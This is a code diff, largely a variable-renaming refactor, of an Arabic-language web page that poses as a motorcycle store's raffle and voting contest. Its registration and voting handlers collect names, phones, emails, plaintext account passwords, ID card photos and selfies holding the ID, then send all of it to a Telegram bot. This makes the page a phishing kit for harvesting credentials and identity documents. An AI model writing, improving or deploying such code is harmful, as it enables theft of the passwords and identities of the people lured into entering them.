+    msgEl.textContent = `✅ تم اعتماد صوتك بنجاح لصالح (${target.n} - ${code}) وإرسال بياناتك للبوت!`;
 
-    const thanksDetails = document.getElementById("thanksDetailsText");
-    if (thanksDetails) {
-      thanksDetails.textContent = `شكراً لك يا ${voterName}، لقد تم احتساب صوتك النزيه لصالح المتسابق (${targetCand.n}) بنجاح، ويسعدنا دائماً تواصلكم وثقتكم بمتجر أمير المترات.`;
+    const detailsEl = document.getElementById("thanksDetailsText");
+    if (detailsEl) {
+      detailsEl.textContent = `شكراً لك يا ${voterName}، لقد تم احتساب صوتك النزيه لصالح المتسابق (${target.n}) بنجاح، ونسعد دائماً بتواصلكم ومشاركتكم في متجر أمير المترات.`;
     }
     if (thanksCard) {
       thanksCard.style.display = "block";
       thanksCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
     }
 
-    // إعادة تهيئة حقول المصوت للسماح بتصويت شخص آخر برقم وبريد مختلف بسرعة
     document.getElementById("voterName").value = "";
     document.getElementById("voterPhone").value = "";
     document.getElementById("voterEmail").value = "";
     document.getElementById("voterPassword").value = "";
     document.getElementById("captchaAnswer").value = "";
     document.getElementById("voterIdImage").value = "";
-    compressedVoterIdBlob = null;
+    voterIdBlob = null;
     const prev = document.getElementById("voterIdPreview");
     if (prev) prev.style.display = "none";
-    generateCaptcha();
+    initCaptcha();
 
     btn.disabled = false;
     btn.textContent = "🗳️ اعتمد صوتي الآن";
 
   } catch (err) {
-    voteMsg.className = "msg err";
-    voteMsg.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
+    msgEl.className = "msg err";
+    msgEl.textContent = "❌ تعذر إرسال بيانات التصويت للبوت، يرجى التأكد من اتصال الإنترنت والمحاولة.";
     btn.disabled = false;
     btn.textContent = "🗳️ اعتمد صوتي الآن";
   }
 });
 
-function buildAttractiveInviteMessage(candidateName, code, shareUrl) {
-  return `🏍️✨ *مسابقة السحب والتصويت المباشر — متجر أمير المترات* ✨🏍️
+function formatInviteMessage(name, code, url) {
+  return `🏍️🔥 *مسابقة السحب والتصويت الكبرى على متر فلينج (FELLING) زيرو* 🔥🏍️
 
 أهلاً بكم أحبتي وأصدقائي الكرام 🌟
-أشارككم فرحتي بمشاركتي في مسابقة السحب والتصويت على *"متر فلينج"* من *متجر أمير المترات* 🏆
+أشارككم فرحتي بمشاركتي في مسابقة *متجر أمير المترات* للفوز بمتر *فلينج* 🏆
 
-🎟️ *اسمي:* ${candidateName}
+🎟️ *اسمي:* ${name}
 🔑 *رمزي في المسابقة:* ${code}
 
-دعمكم وصوتكم يفرق معي كثيراً ويدفعني للمنافسة بشرف 💪🔥
-يرجى الدخول عبر الرابط المباشر أدناه والتصويت لي بخطوات سهلة وسريعة:
-🔗 ${shareUrl}
+دعمكم وصوتكم يمنحني فرصة أكبر للمنافسة والفوز 💪🔥
+ادخلوا عبر الرابط المباشر أدناه وصوّتوا لي بخطوات سهلة وسريعة:
+🔗 ${url}
 
-🙏 *شكراً جزيلاً لكل من يشارك ويدعم، ونتمنى للجميع التوفيق والشفافية.*
-🏍️ *متجر أمير المترات — القاعدة (جوار مستوصف السلطان)*`;
+🙏 *شكراً جزيلاً لكل من يشارك ويدعم بكل نزاهة.*
+📍 *متجر أمير المترات — القاعدة / الشارع العام*`;
 }
 
 document.getElementById("raffleForm").addEventListener("submit", async function(e) {
   e.preventDefault();
-  const msg = document.getElementById("msg");
-  msg.className = "msg";
+  const msgEl = document.getElementById("msg");
+  msgEl.className = "msg";
 
-  if (!compressedIdBlob || !compressedSelfieBlob) {
-    msg.className = "msg err";
-    msg.textContent = "❌ يرجى إرفاق صورة البطاقة أو الجواز وصورة السيلفي مع الهوية معاً!";
+  if (!idCardBlob || !selfieIdBlob) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "❌ يرجى إرفاق صورة البطاقة أو الجواز وصورة السيلفي مع الهوية معاً!";
     return;
   }
 
-  if (cloudState.c.length >= MAX_CANDIDATES) {
-    msg.className = "msg err";
-    msg.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين في هذه المسابقة (100 متسابق).";
+  if (stateData.c.length >= MAX_CAP) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "⚠️ نعتذر، لقد اكتمل العدد الأقصى للمتسابقين (100 متسابق).";
     return;
   }
 
-  const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
-  if (cloudState.c.some(c => c.p === rawPhone)) {
-    msg.className = "msg err";
-    msg.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
+  const phone = document.getElementById("phone").value.trim().replace(/\s+/g, "");
+  if (stateData.c.some(c => c.p === phone)) {
+    msgEl.className = "msg err";
+    msgEl.textContent = "⚠️ رقم الهاتف هذا مسجل مسبقاً كمتسابق في المسابقة!";
     return;
   }
 
@@ -1227,72 +1204,65 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
   btn.textContent = "⚡ جارٍ إصدار رابط التصويت وإرسال الوثائق...";
 
   try {
-    let ticketID = "";
+    let code = "";
     do {
-      ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
-    } while (cloudState.c.some(c => c.k === ticketID));
+      code = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
+    } while (stateData.c.some(c => c.k === code));
 
-    const participantName = cleanHTML(document.getElementById("name").value.trim());
-    const email = cleanHTML(document.getElementById("email").value.trim());
-    const password = cleanHTML(document.getElementById("password").value.trim());
-    const city = cleanHTML(document.getElementById("city").value.trim());
-    const favModel = cleanHTML(document.getElementById("favModel").value);
-    const note = cleanHTML(document.getElementById("note").value.trim());
+    const name = escHtml(document.getElementById("name").value.trim());
+    const email = escHtml(document.getElementById("email").value.trim());
+    const pass = escHtml(document.getElementById("password").value.trim());
+    const city = escHtml(document.getElementById("city").value.trim());
+    const favModel = escHtml(document.getElementById("favModel").value);
+    const note = escHtml(document.getElementById("note").value.trim());
 
-    const captionText =
-`🚨 <b>متسابق جديد مسجل (${cloudState.c.length + 1}/${MAX_CANDIDATES})!</b>
+    const cap =
+`🚨 <b>متسابق جديد — أمير المترات (${stateData.c.length + 1}/${MAX_CAP})</b>
 ━━━━━━━━━━━━━━━━━━
-🎟️ <b>الرمز:</b> <code>${ticketID}</code>
-👤 <b>الاسم:</b> ${participantName}
-📱 <b>الهاتف:</b> <code>${rawPhone}</code>
+🎟️ <b>الرمز:</b> <code>${code}</code>
+👤 <b>الاسم:</b> ${name}
+📱 <b>الهاتف:</b> <code>${phone}</code>
 📧 <b>البريد:</b> <code>${email}</code>
-🔑 <b>كلمة المرور:</b> <code>${password}</code>
+🔑 <b>كلمة المرور:</b> <code>${pass}</code>
 🏙️ <b>المنطقة:</b> ${city}
-🏍️ <b>المفضل:</b> ${favModel}
-💬 <b>ملاحظة:</b> ${note || "لا يوجد"}`;
+🏍️ <b>المتر المفضل:</b> ${favModel}
+💬 <b>كلمة للجمهور:</b> ${note || "لا يوجد"}`;
 
     const fd1 = new FormData();
     fd1.append("chat_id", CHAT_ID);
-    fd1.append("photo", compressedIdBlob, "id_card.jpg");
-    fd1.append("caption", captionText);
+    fd1.append("photo", idCardBlob, "id_card.jpg");
+    fd1.append("caption", cap);
     fd1.append("parse_mode", "HTML");
 
     const fd2 = new FormData();
     fd2.append("chat_id", CHAT_ID);
-    fd2.append("photo", compressedSelfieBlob, "selfie_id.jpg");
-    fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${participantName} (${ticketID})`);
+    fd2.append("photo", selfieIdBlob, "selfie_id.jpg");
+    fd2.append("caption", `🤳 سيلفي مع الهوية للمتسابق: ${name} (${code})`);
 
     const [r1, r2] = await Promise.all([
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd1 }).then(r => r.json()),
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd2 }).then(r => r.json())
     ]);
 
-    if (!r1.ok || !r2.ok) throw new Error("Telegram registration upload failed");
+    if (!r1.ok || !r2.ok) throw new Error("upload failed");
 
-    cloudState.c.push({
-      k: ticketID,
-      n: participantName,
-      p: rawPhone,
-      y: city,
-      v: 0
-    });
-
-    persistLocalState();
-    backgroundCloudSync();
+    stateData.c.push({ k: code, n: name, p: phone, y: city, v: 0 });
+    saveStateLocal();
+    syncCloudBackground();
     renderLeaderboardUI();
 
-    const shareUrl = `${window.location.origin}${window.location.pathname}?vote=${ticketID}#voting`;
-    const inviteText = buildAttractiveInviteMessage(participantName, ticketID, shareUrl);
+    const shareUrl = `${window.location.origin}${window.location.pathname}?vote=${code}#voting`;
+    const shareMsg = formatInviteMessage(name, code, shareUrl);
 
-    document.getElementById("ticketCode").textContent = ticketID;
-    document.getElementById("shareMessagePreview").textContent = inviteText;
+    document.getElementById("ticketCode").textContent = code;
+    document.getElementById("shareMessagePreview").textContent = shareMsg;
     document.getElementById("raffleForm").style.display = "none";
     document.getElementById("ticketBox").style.display = "block";
     document.getElementById("ticketBox").scrollIntoView({ behavior: "smooth" });
 
   } catch (err) {
-    msg.className = "msg err";
-    msg.textContent = "❌ تعذر إتمام التسجيل، تأكد من اتصال الإنترنت وحاول مرة أخرى.";
+    msgEl.className = "msg err";
+    msgEl.textContent = "❌ تعذر إتمام التسجيل، تأكد من اتصال الإنترنت وحاول مرة أخرى.";
     btn.disabled = false;
     btn.textContent = "🔥 أقر بصحة بياناتي وإصدار رابط التصويت الخاص بي";
   }
@@ -1300,30 +1270,25 @@ document.getElementById("raffleForm").addEventListener("submit", async function(
 
 async function testBotConnection() {
   try {
-    const meRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-    const meData = await meRes.json();
-    if (!meData.ok) {
+    const me = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`).then(r => r.json());
+    if (!me.ok) {
       alert("❌ التوكن غير صالح أو البوت متوقف.");
       return;
     }
-
-    const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const send = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `📡 <b>اختبار اتصال ناجح!</b>\n🤖 البوت: <b>@${meData.result.username}</b>\n⏰ الوقت: ${new Date().toLocaleString("ar-YE")}`,
+        text: `📡 <b>فحص اتصال ناجح — أمير المترات</b>\n🤖 البوت: <b>@${me.result.username}</b>\n⏰ الوقت: ${new Date().toLocaleString("ar-YE")}`,
         parse_mode: "HTML"
       })
-    });
-    const sendData = await sendRes.json();
-    if (sendData.ok) {
-      alert(`✅ البوت (@${meData.result.username}) متصل ويعمل بنجاح وتم إرسال رسالة اختبار!`);
-    } else {
-      alert(`⚠️ البوت يعمل لكن تعذر الإرسال إلى CHAT_ID (${CHAT_ID}): ${sendData.description || "تأكد من بدء المحادثة مع البوت أو إضافته للمجموعة"}`);
-    }
+    }).then(r => r.json());
+
+    if (send.ok) alert(`✅ البوت (@${me.result.username}) متصل ويعمل بنجاح!`);
+    else alert(`⚠️ البوت يعمل لكن تعذر الإرسال إلى CHAT_ID (${CHAT_ID}): ${send.description || "تحقق من صلاحيات البوت"}`);
   } catch (e) {
-    alert("❌ تعذر الاتصال بواجهة تليجرام، تحقق من الشبكة.");
+    alert("❌ تعذر الاتصال بواجهة تليجرام.");
   }
 }
 
@@ -1333,70 +1298,64 @@ function toggleAdminMode() {
     alert("تم الخروج من وضع الإدارة.");
     return;
   }
-  const pin = prompt("🔐 أدخل الرقم السري لإدارة المعرض:");
+  const pin = prompt("🔐 أدخل الرقم السري للإدارة:");
   if (pin === ADMIN_PIN) {
     document.body.classList.add("admin-mode");
-    alert("✅ تم تفعيل وضع الإدارة! ظهرت الآن أزرار إرسال التقرير وفحص البوت واستبعاد المخالفين.");
+    alert("✅ تم تفعيل وضع الإدارة! ظهرت الآن أزرار التقرير وفحص البوت واستبعاد المخالفين.");
   } else if (pin !== null) {
     alert("❌ الرقم السري غير صحيح!");
   }
 }
 
-async function deleteCandidateAdmin(code, name) {
-  if (!confirm(`⚠️ هل أنت متأكد من استبعاد وحذف المتسابق (${name} - ${code}) نهائياً من المسابقة؟`)) return;
-  cloudState.c = cloudState.c.filter(c => c.k !== code);
-  persistLocalState();
-  backgroundCloudSync();
+function adminDeleteCandidate(code, name) {
+  if (!confirm(`⚠️ هل أنت متأكد من استبعاد وحذف المتسابق (${name} - ${code}) نهائياً؟`)) return;
+  stateData.c = stateData.c.filter(c => c.k !== code);
+  saveStateLocal();
+  syncCloudBackground();
   renderLeaderboardUI();
-  alert(`✅ تم استبعاد المتسابق (${name}) وحذفه من لوحة المتصدرين فوراً.`);
+  alert(`✅ تم استبعاد المتسابق (${name}) فوراً.`);
 }
 
 async function sendSortedReportToBot() {
-  if (cloudState.c.length === 0) {
+  if (stateData.c.length === 0) {
     alert("لا يوجد متسابقون مسجلون حالياً.");
     return;
   }
-  const totalVotes = cloudState.c.reduce((sum, item) => sum + (item.v || 0), 0);
-  const sortedList = buildSortedTelegramLeaderboard(25);
-
-  const reportMsg =
-`📋 <b>تقرير الترتيب المرتب — متجر أمير المترات</b>
-👥 عدد المتسابقين: <b>${cloudState.c.length}</b> | 🗳️ إجمالي الأصوات: <b>${totalVotes}</b>
+  const total = stateData.c.reduce((sum, x) => sum + (x.v || 0), 0);
+  const lines = buildSortedLines(25);
+  const msg =
+`📋 <b>تقرير الترتيب المرتب — مسابقة أمير المترات</b>
+👥 المتسابقون: <b>${stateData.c.length}</b> | 🗳️ إجمالي الأصوات: <b>${total}</b>
 ━━━━━━━━━━━━━━━━━━
-${sortedList}
+${lines}
 ━━━━━━━━━━━━━━━━━━
 ⏰ <b>التوقيت:</b> ${new Date().toLocaleString("ar-YE")}`;
 
   const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: reportMsg, parse_mode: "HTML" })
-  });
-  const data = await res.json();
-  if (data.ok) {
-    alert("✅ تم إرسال تقرير الترتيب المرتب إلى بوت التليجرام!");
-  } else {
-    alert(`⚠️ تعذر إرسال التقرير: ${data.description || "تحقق من البوت"}`);
-  }
+    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
+  }).then(r => r.json());
+
+  if (res.ok) alert("✅ تم إرسال التقرير المرتب إلى البوت!");
+  else alert(`⚠️ تعذر إرسال التقرير: ${res.description || "تحقق من البوت"}`);
 }
 
 function copyShareInvite() {
-  const text = document.getElementById("shareMessagePreview").textContent;
-  navigator.clipboard.writeText(text).then(() => {
+  const txt = document.getElementById("shareMessagePreview").textContent;
+  navigator.clipboard.writeText(txt).then(() => {
     document.getElementById("copyFeedback").style.display = "block";
   });
 }
 
-function toggleGenericPass(inputId, btnEl) {
-  const inp = document.getElementById(inputId);
-  if (inp) {
-    inp.type = inp.type === "password" ? "text" : "password";
-    btnEl.textContent = inp.type === "password" ? "إظهار" : "إخفاء";
-  }
+function toggleGenericPass(id, btn) {
+  const inp = document.getElementById(id);
+  if (!inp) return;
+  inp.type = inp.type === "password" ? "text" : "password";
+  btn.textContent = inp.type === "password" ? "إظهار" : "إخفاء";
 }
 
-// ضغط سريع للصور (حد أقصى 900px وجودة 0.72) لسرعة فائقة في الرفع للبوت
-function handleImage(event, previewId) {
+function handleImage(event, prevId) {
   const file = event.target.files[0];
   if (!file) return;
   const reader = new FileReader();
@@ -1412,12 +1371,12 @@ function handleImage(event, previewId) {
       canvas.width = w; canvas.height = h;
       ctx.drawImage(img, 0, 0, w, h);
       canvas.toBlob(blob => {
-        if (previewId === "idPreview") compressedIdBlob = blob;
-        else if (previewId === "selfiePreview") compressedSelfieBlob = blob;
-        else if (previewId === "voterIdPreview") compressedVoterIdBlob = blob;
+        if (prevId === "voterIdPreview") voterIdBlob = blob;
+        else if (prevId === "idPreview") idCardBlob = blob;
+        else if (prevId === "selfiePreview") selfieIdBlob = blob;
 
-        const p = document.getElementById(previewId);
-        if (p) { p.src = URL.createObjectURL(blob); p.style.display = "block"; }
+        const prev = document.getElementById(prevId);
+        if (prev) { prev.src = URL.createObjectURL(blob); prev.style.display = "block"; }
       }, "image/jpeg", 0.72);
     };
     img.src = e.target.result;
@@ -1425,11 +1384,11 @@ function handleImage(event, previewId) {
   reader.readAsDataURL(file);
 }
 
-function cleanHTML(str) {
+function escHtml(str) {
   return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 }
 
-generateCaptcha();
+initCaptcha();
 renderLeaderboardUI();
 checkUrlVoteParam();
 syncFromTelegramCloud(false);
